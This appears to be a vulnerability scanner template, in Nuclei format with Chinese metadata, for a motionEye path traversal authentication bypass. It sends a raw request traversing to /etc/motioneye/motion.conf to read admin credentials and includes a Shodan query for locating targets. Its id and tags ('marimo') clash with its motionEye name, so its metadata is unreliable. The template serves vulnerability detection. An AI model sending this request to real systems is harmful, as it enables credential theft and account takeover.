id: marimo-unauth

info:
  name: motionEye 部分 - 认证绕过
  author: pussycat0x
  severity: critical
  description: |-
    路径遍历漏洞允许未认证攻击者访问受保护资源并绕过认证控制。
  impact: 攻击者可在未登录的情况下窃取管理员凭据，可能导致管理员账户被完全接管。
  reference:
    - https://github.com/advisories/GHSA-phv5-334h-mxcw
  metadata:
    max-request: 2
    shodan-query: http.title:"motionEye"
  tags: marimo,unauth,misconfig


http:
  - raw:
      - |
        GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains_all(body, 'admin_username','admin_password')"
        condition: and
